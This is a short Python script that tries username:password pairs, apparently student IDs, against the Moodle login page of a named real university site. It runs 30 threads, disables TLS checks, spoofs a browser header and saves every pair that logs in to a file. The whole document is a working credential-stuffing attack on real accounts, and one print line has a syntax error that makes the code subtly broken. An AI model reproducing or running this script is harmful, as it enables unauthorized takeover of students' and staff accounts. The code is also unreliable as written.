# coder : oncom
import requests as req
from re import findall as fa
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from os import system
from colorama import init
req.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init()
kng = '\33[93m'
mrh = '\33[91m'
pth = '\33[m'
ijo = '\33[92m'
ppl = '\33[95m'
br = '\33[94m'


ok = []


def usd(c, usr, pwd):
    u = 'https://belajar.usd.ac.id/login/index.php'
    rs = req.session()
    rg = rs.get(u, verify=False).text
    tkn = fa('logintoken.*', rg)[0].split('"')[2]
    hdr = {'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-T537A Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/35.0.1916.141 Safari/537.36'}
    data = {'anchor': '', 
            'logintoken' : tkn,
            'username' : usr,
            'password' : pwd}
    rp = rs.post(u, headers=hdr, data=data, verify=False)
    ggl = fa('Invalid login.*', rp.text)
    if ggl:
        print(ppl+c+kng+'. '+mrh+usr+kng+':'+mrh+pwd+pth)
    else:
        ok.append(usr+':'+pwd)
        print(br+c+'. '+ijo+usr+br':'+ijo+pwd+pth+' > usd.txt')
        with open('usd.txt', 'a') as f:
            f.write(usr+':'+pwd+'\n')
        f.close()


def main():
    j = 0
    with open('nim.txt', 'r') as ln:
        l = ln.readlines()
        print(str(len(l))+' baris')
        with ThreadPoolExecutor(max_workers=30) as t:
            for i in l:
                j += 1
                c = str(j)
                x = i.strip().split(':')
                t.submit(usd, c, x[0], x[1])
    ln.close()


if __name__=='__main__':
    main()
    if len(ok) != 0:
        print('\n')
        for i in ok:
            print(i)
        print('\n{0:.^30}'.format('Cek usd.txt'))
